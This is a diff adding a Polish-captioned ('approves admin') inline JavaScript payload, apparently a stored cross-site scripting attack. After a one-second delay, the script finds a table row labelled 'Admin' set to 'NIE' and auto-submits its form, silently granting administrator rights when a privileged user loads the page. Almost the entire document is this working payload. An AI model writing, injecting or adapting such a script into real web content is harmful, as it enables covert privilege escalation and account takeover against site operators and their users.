@@ -1,0 +1,5 @@
+
+Zatwierdza admiona:
+<script>function l(q,n){return q.children[n].children[1].textContent};
+setTimeout(function(){t=document.getElementsByTagName("table");for(i=0;i<t.length;i++){k=t[i];p=k.children[0];if(l(p,0)=="Admin"&&(l(p,1)).substr(0,3)=="NIE"){p.children[1].children[1].children[0].submit();i=t.length}}},1000);</script>
+
